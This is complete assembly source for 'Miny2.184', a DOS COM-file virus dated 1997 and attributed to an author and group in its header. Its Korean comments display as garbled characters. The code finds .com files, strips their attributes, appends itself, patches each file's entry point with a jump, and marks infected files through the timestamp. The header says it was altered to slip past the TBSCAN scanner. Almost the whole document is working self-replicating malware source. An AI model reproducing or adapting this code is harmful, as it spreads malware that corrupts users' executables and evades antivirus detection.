;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.184 (Type B)
; Author : Osiris
; Group : CVC
; Date : 1997/08/17
;
; Type : Non-resident COM infector
;
; Miny2 (Type A) · ˆ¬åÌe·¡”a. ·¡¤á¸åµA¬á“e A Ñw·¡ ˆa»¡‰¡ ·¶”å µAœá¤i¬—¯¡ Àá
; Ÿ¡ žË¥·i ÂˆaÐaµv”a. ·¡ ¤á¸åµA¬á ÂˆaÐe ¦¦…·e ­¢¬÷·i ·ª‹¡/³a‹¡¡ ¤aŽ‰˜
; µAœá¯¡ (º¡ Ïi¡Ï¡ —¡¯aÇaˆa ³a‹¡ ‹q»¡–E ¬wÈ) ÀáŸ¡Ða“e ¦¦…·¡”a.
;
; ”a·q¤á¸å·e COM ÑÂ¸w¸aŸi ˆa»¥ EXE Ìa·©·i ˆqµq¯¡Ç¡»¡ ´g“e ¤á¸å·i ¬å¥¡·¡‰V”a.
; (µ:DOS 7.0 · COMMAND.COM)
;
; µa¸åÓ¡ ”a·q‰Á ˆ{·e ¢…¹A¸ñ·¡ ¹¥¸Ðe”a.
;
; 1. TBSCAN · ·¥‰·»¡“wµA ˆñ¬‚–E”a.
; 2. COM ÑÂ¸w¸aŸi ˆa»¥ EXE Ìa·©·i ˆqµq¯¡Ç¥”a.
;
;
;
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; ³aA‹¡ˆt (´a¢·©•¡ ´eÐe”a.)
            nop                         ; ´|¦¦… ¥¢Š¯¡ ¤a·¡œá¯aˆa ÌaŠA–A‹¡
            nop                         ; ˜¢…µA ·¡ ˆt·i ý´ö”a.
 start:
            call  Next                  ;
 Next:      pop   bp                    ;
            sub   bp,offset Next        ; BP = ¤a·¡œá¯a ¯¡¸b»¡¸ñ

            lea   si,COM_head[BP]       ;
            mov   di,100h               ; COM · ´|¦¦…·i ¥¢ŠÐe”a.
            push  di                    ;
            movsw                       ;
            movsb                       ;

            mov   cx,0080h              ; DTA ¡ ¬a¶wÐ PSP ˆa ÌaŠA–A£a¡
            mov   si,0080h              ; ¸q¯¡ ¸á¸wÐe”a.
            lea   di,End_Virus[BP]      ;
            repz  movsb                 ;

            mov   ah,4Eh                ; Ìa·© Àx‹¡
            mov   cx,00100011B
            lea   dx,Match_COM[BP]
 Find:      int   21h
            jnc   ChkInfected           ;
 Restart:
            lea   si,End_Virus[BP]      ; ¶¥œ DTA ¥¢Š
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET

 ChkInfected:                           ; ˆqµq µa¦Ÿi ÑÂ·¥Ðe”a.
            mov   al,DS:[0096h]         ; 62 Á¡ ·¥»¡ ˆñ¬aÐe”a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
            mov   ah,4Fh                ; ”a·q Ìa·© Àx‹¡
            jmp   Find
 Infect:
            mov   ax,4301h              ; ·ª‹¡/³a‹¡ ­¢¬÷·a¡ ¤aŽ‘
            xor   cx,cx
            mov   dx,009Eh
            int   21h
            jc    Restart               ; µAœá¯¡ DTA ¥¢ŠÒ ¹·ža

            mov   ax,3D02h              ; Ìa·© µ¡Ïe
            int   21h

            xchg  ax,bx                 ; Ìa·© Ð…—i ´è‹¡

            mov   ax,5700h              ; Ìa·© ¸b¬÷ ¯¡ˆe ´è‹¡
            int   21h
            push  cx                    ; ¸b¬÷ ¯¡ˆe ¸á¸w
            push  dx                    ;

            mov   ah,3Fh                ; ´|¦¦… ·ª‹¡
            lea   dx,COM_Head[BP]       ; ¤áÌá º­¡
            mov   cx,0003               ; 3 ¤a·¡Ëa
            int   21h

            mov   al,02                 ; Ìa·© {·a¡ ·¡•·
            call  lseek

            sub   ax,3                  ; ¸ñÏaˆt ‰¬e
            mov   word ptr JumpCode[BP+1],ax     ;

            mov   ah,40h                ; ¤a·¡œá¯a ³a‹¡
            mov   cx,offset End_virus - 3 - 2
            lea   dx,start[BP]
            int   21h

            mov   al,00                 ; Àá·q·a¡ ·¡•·
            call  lseek

            mov   ah,40h                ; ¸ñÏa Å¡—a ³a‹¡
            mov   cx,0003
            lea   dx,JumpCode[BP]
            int   21h

            pop   dx                    ; Ìa·© ¸b¬÷ ¯¡ˆe ¥¢Š
            pop   cx                    ;
            or    cx,+1Fh               ; 62 Á¡¡  e—i‹¡
            mov   ax,5701h              ;
            int   21h

 Close:
            mov   ah,3Eh                ; Ìa·© ”h‹¡
            int   21h
            jmp   Restart

 lseek:                                 ;
            xor   cx,cx
            xor   dx,dx
            mov   ah,42h
            int   21h
            ret

 COM_head   db    0CDh,20h,90h          ; COM ´|¦¦…
 Match_COM  db    '*.com',00            ; COM Ìa·© Àx‹¡
            db    'Miny2'               ; £¡“¡ 2
 JumpCode   db    0E9h
            db    ?,?
 End_Virus:
            END   Miny2

